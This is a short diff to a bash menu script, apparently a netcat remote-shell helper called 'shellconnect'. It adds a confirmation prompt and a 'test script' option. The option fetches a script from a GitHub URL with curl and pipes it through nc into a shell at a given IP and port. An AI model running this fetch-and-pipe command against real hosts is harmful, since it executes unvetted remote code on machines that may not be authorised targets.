@@ -102,14 +102,30 @@ mode_menu() {
 	done
 }
 
+se_confirm() {
+	read -p "execute? (y/n):  " c
+	if [[ $c == "y" ]]; then
+		return 0
+	else
+		return 1
+	fi
+}
+
 script_execution() {
 	while true; do
 		echo "	:: shellconnect - script@$ip:$NC_PORT ::"
+		echo "(1) - test script"
 		echo "(00) - Go back"
 		echo "(0) - Exit"
 		read -p "choose an option:  " c
 
 		case $c in
+			1)
+				echo "test script selected."
+				if se_confirm; then
+					curl -sSL https://raw.githubusercontent.com/0x0elliot/masterplan/main/test.sh | nc ${ip} ${NC_PORT}
+				fi
+				;;
 			00)
 				return
 				;;
